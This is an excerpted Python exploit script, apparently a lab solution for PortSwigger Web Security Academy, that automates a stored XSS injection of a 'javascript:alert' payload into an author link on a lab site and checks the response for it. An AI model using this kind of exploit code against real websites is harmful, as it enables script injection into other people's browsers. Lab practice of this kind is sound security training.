...
Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "javascript:alert('XSS')" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "javascript:alert('XSS')" 
...
parser.add_argument('-c', '--command', help='Command to run, Example: javascript:alert(\'XSS\')', required=True)
...
def xss(url, command, csrf, path):
    ...
    if args.proxy:
        ...
        # verify the response contains the alert with HTML-encoded single quotes
        if (b'javascript:alert(&apos;XSS&apos;)' in r.content):
            print("(+) Stored XSS Successful!")
            print("Go to the opened window and click on author link to view the XSS")
